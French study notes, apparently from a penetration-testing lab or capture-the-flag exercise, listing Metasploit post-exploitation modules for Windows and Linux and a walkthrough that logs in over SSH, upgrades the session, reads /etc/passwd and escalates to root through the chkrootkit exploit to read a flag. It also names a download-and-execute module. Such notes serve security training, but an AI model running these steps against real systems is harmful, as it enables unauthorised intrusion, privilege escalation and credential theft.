## Windows

`post/windows/gather/win_privs` : sert à connaitre les privilèges de la sessions actuelle, si UAC est activée, s'il est admin...  

`post/windows/gather/enum_logged_on_users` : Enumère les utilisateurs windows récemment connectés.  

`post/windows/gather/checkvm` : Vérifie si la machine est une VM  

`post/windows/gather/enum_applications` : Enumère les appli installées.  

`post/windows/gather/enum_av_excluded` : enumere files, directories, extensions etc, des produites supportés par l'AV.  

`post/windows/gather/enum_computer`  
`post/windows/gather/enum_patches`  
`post/windows/gather/enum_shares`  



`loot` permet de voir ce qui est stocké dans `/root/.msf4.loot`, ce sont les résultats des commandes ci dessus.  


## Linux

`exploit/samba/is_known_pipename`  
`session -u 1`  

``post/linux/gather/enum_configs``  
``post/multi/gather/env``  
``post/linux/gather/enum_network``  
``post/linux/gather/enum_protections``  
``post/linux/gather/enum_system``  
``post/linux/gather/checkcontainer``  
``post/linux/gather/checkvm``  
``post/linux/gather/enum_users_history``  
``post/multi/manage/system_session``  
``post/linux/manage/download_exec``  


`loot` permet de voir ce qui est stocké dans `/root/.msf4.loot`, ce sont les résultats des commandes ci dessus.  

Après `auxiliary/scanner/ssh/ssh_login` et une authentification réussie, on bascule en bash : `/bin/bash -i`, on met en background, puis on upgrade la sessions `session -u 1`. on recupère la nouvelle session, et on peut aller voir les credentials linux (/etc/passwd)  
`ps aux`, on voit que root a des services actifs, dont "/bin/bash /bin/check-down" et un "cron".  
`cat /bin/check-down`, `command -v chkrootkit`  
``use exploit/unix/local/chkrootkit``  
``set CHKROOTKIT /bin/chkrootkit``  
``set session 1``  
``set LHOST 192.60.22.2``  
``exploit``  
``cat /root/flag``  

